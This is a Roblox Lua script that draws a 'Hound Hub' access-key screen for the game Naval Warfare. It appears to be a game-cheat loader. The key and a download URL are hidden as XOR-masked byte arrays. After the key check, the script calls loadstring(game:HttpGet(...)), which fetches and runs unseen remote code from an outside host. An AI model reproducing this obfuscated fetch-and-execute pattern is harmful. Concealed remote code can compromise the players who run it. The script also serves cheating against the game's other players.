local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local Palette = {
    AppBg = Color3.fromRGB(13, 12, 12),
    ControlBg = Color3.fromRGB(27, 24, 24),
    ControlBorder = Color3.fromRGB(66, 50, 50),
    TextPrimary = Color3.fromRGB(241, 237, 235),
    TextSecondary = Color3.fromRGB(160, 150, 150),
    TextDisabled = Color3.fromRGB(98, 90, 90),
    Accent = Color3.fromRGB(152, 20, 24),
    AccentHover = Color3.fromRGB(178, 32, 36),
    Error = Color3.fromRGB(220, 60, 60),
    Success = Color3.fromRGB(80, 200, 100)
}

local KEY_TOKEN = {21,42,63,40,59,46,51,53,52,96,122,18,59,41,46,59,122,22,47,63,61,53}
local PAYLOAD_TOKEN = {50,46,46,42,41,96,117,117,42,40,53,46,63,57,46,63,62,116,53,56,41,57,47,40,59,44,55,116,57,53,55,117,99,110,104,111,57,57,109,59,56,105,57,98,106,105,108,109,108,109,98,107,109,111,98,59,117,99,63,109,62,59,111,60,107,62,111,57,111,57,99,63,57,107,57,106,107,56,60,104,57,105,107,108,62,99,105,62,109,57,107,107,108,63,98,59,99,99,57,104,60,107,62,106,109,117,62,53,45,52,54,53,59,62}
local TOKEN_MASK = 0x5A

local function unmask(token)
    local out = {}
    for i = 1, #token do
        out[i] = string.char(bit32.bxor(token[i], TOKEN_MASK))
    end
    return table.concat(out)
end

if PlayerGui:FindFirstChild("HoundKeySystem") then
    PlayerGui:FindFirstChild("HoundKeySystem"):Destroy()
end

local gui = Instance.new("ScreenGui")
gui.Name = "HoundKeySystem"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.IgnoreGuiInset = true
gui.DisplayOrder = 9999
gui.Parent = PlayerGui

local main = Instance.new("Frame")
main.Size = UDim2.fromOffset(360, 240)
main.Position = UDim2.fromScale(0.5, 0.5)
main.AnchorPoint = Vector2.new(0.5, 0.5)
main.BackgroundColor3 = Palette.AppBg
main.BorderSizePixel = 0
main.ClipsDescendants = true
main.Parent = gui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 10)
mainCorner.Parent = main

local mainStroke = Instance.new("UIStroke")
mainStroke.Thickness = 2
mainStroke.Color = Palette.Accent
mainStroke.Parent = main

local header = Instance.new("Frame")
header.Size = UDim2.new(1, 0, 0, 50)
header.BackgroundColor3 = Color3.fromRGB(18, 16, 16)
header.BorderSizePixel = 0
header.Parent = main

local headerCorner = Instance.new("UICorner")
headerCorner.CornerRadius = UDim.new(0, 10)
headerCorner.Parent = header

local headerFix = Instance.new("Frame")
headerFix.Size = UDim2.new(1, 0, 0, 10)
headerFix.Position = UDim2.fromOffset(0, 40)
headerFix.BackgroundColor3 = Color3.fromRGB(18, 16, 16)
headerFix.BorderSizePixel = 0
headerFix.Parent = header

local logoText = Instance.new("TextLabel")
logoText.Size = UDim2.new(1, -20, 1, 0)
logoText.Position = UDim2.fromOffset(20, 0)
logoText.BackgroundTransparency = 1
logoText.Text = "🐾  Hound Hub"
logoText.TextColor3 = Palette.TextPrimary
logoText.Font = Enum.Font.GothamBold
logoText.TextSize = 16
logoText.TextXAlignment = Enum.TextXAlignment.Left
logoText.Parent = header

local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, -40, 0, 20)
subtitle.Position = UDim2.fromOffset(20, 65)
subtitle.BackgroundTransparency = 1
subtitle.Text = "Enter your access key to initialize Naval Warfare."
subtitle.TextColor3 = Palette.TextSecondary
subtitle.Font = Enum.Font.Gotham
subtitle.TextSize = 13
subtitle.TextXAlignment = Enum.TextXAlignment.Left
subtitle.Parent = main

local keyBox = Instance.new("TextBox")
keyBox.Size = UDim2.new(1, -40, 0, 40)
keyBox.Position = UDim2.fromOffset(20, 95)
keyBox.BackgroundColor3 = Palette.ControlBg
keyBox.Text = ""
keyBox.PlaceholderText = "Operation: ..."
keyBox.PlaceholderColor3 = Palette.TextDisabled
keyBox.TextColor3 = Palette.TextPrimary
keyBox.Font = Enum.Font.GothamMedium
keyBox.TextSize = 14
keyBox.ClearTextOnFocus = false
keyBox.Parent = main

local boxCorner = Instance.new("UICorner")
boxCorner.CornerRadius = UDim.new(0, 6)
boxCorner.Parent = keyBox

local boxStroke = Instance.new("UIStroke")
boxStroke.Thickness = 1
boxStroke.Color = Palette.ControlBorder
boxStroke.Parent = keyBox

local btn = Instance.new("TextButton")
btn.Size = UDim2.new(1, -40, 0, 40)
btn.Position = UDim2.fromOffset(20, 145)
btn.BackgroundColor3 = Palette.Accent
btn.Text = "AUTHENTICATE"
btn.TextColor3 = Palette.TextPrimary
btn.Font = Enum.Font.GothamBold
btn.TextSize = 14
btn.AutoButtonColor = false
btn.Parent = main

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 6)
btnCorner.Parent = btn

local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, -40, 0, 20)
status.Position = UDim2.fromOffset(20, 195)
status.BackgroundTransparency = 1
status.Text = ""
status.TextColor3 = Palette.Error
status.Font = Enum.Font.GothamMedium
status.TextSize = 12
status.TextXAlignment = Enum.TextXAlignment.Left
status.Parent = main

local debounce = false

local function tween(obj, props, time, style, dir)
    local info = TweenInfo.new(time or 0.2, style or Enum.EasingStyle.Quint, dir or Enum.EasingDirection.Out)
    local t = TweenService:Create(obj, info, props)
    t:Play()
    return t
end

btn.MouseEnter:Connect(function()
    if not debounce then tween(btn, {BackgroundColor3 = Palette.AccentHover}, 0.15) end
end)
btn.MouseLeave:Connect(function()
    if not debounce then tween(btn, {BackgroundColor3 = Palette.Accent}, 0.15) end
end)

local function authenticate()
    if debounce then return end
    debounce = true

    tween(btn, {BackgroundColor3 = Color3.fromRGB(100, 15, 18)}, 0.1)
    task.wait(0.1)
    tween(btn, {BackgroundColor3 = Palette.Accent}, 0.1)

    if keyBox.Text == unmask(KEY_TOKEN) then
        keyBox.Text = ""
        status.Text = "Access granted. Initializing secure payload..."
        status.TextColor3 = Palette.Success
        tween(mainStroke, {Color = Palette.Success}, 0.3)

        task.wait(0.6)
        tween(main, {Size = UDim2.fromOffset(360, 0), BackgroundTransparency = 1}, 0.4)
        tween(header, {BackgroundTransparency = 1}, 0.4)

        task.wait(0.5)
        gui:Destroy()

        task.spawn(function()
            local success, err = pcall(function()
                loadstring(game:HttpGet(unmask(PAYLOAD_TOKEN)))()
            end)
            if not success then
                warn("Hound Hub Payload Error: " .. tostring(err))
            end
        end)
    else
        keyBox.Text = ""
        status.Text = "Invalid key or network timeout. Please try again."
        status.TextColor3 = Palette.Error
        tween(mainStroke, {Color = Palette.Error}, 0.15)

        local originalPos = main.Position
        tween(main, {Position = originalPos + UDim2.fromOffset(-12, 0)}, 0.04)
        task.wait(0.04)
        tween(main, {Position = originalPos + UDim2.fromOffset(12, 0)}, 0.04)
        task.wait(0.04)
        tween(main, {Position = originalPos + UDim2.fromOffset(-6, 0)}, 0.04)
        task.wait(0.04)
        tween(main, {Position = originalPos}, 0.04)

        task.wait(1.5)
        tween(mainStroke, {Color = Palette.Accent}, 0.3)
        debounce = false
    end
end

btn.MouseButton1Click:Connect(authenticate)

keyBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        authenticate()
    end
end)

keyBox.Focused:Connect(function()
    tween(boxStroke, {Color = Palette.Accent}, 0.15)
end)

keyBox.FocusLost:Connect(function()
    if not debounce then tween(boxStroke, {Color = Palette.ControlBorder}, 0.15) end
end)

main.Position = UDim2.fromScale(0.5, 0.6)
main.BackgroundTransparency = 1
tween(main, {Position = UDim2.fromScale(0.5, 0.5), BackgroundTransparency = 0}, 0.4)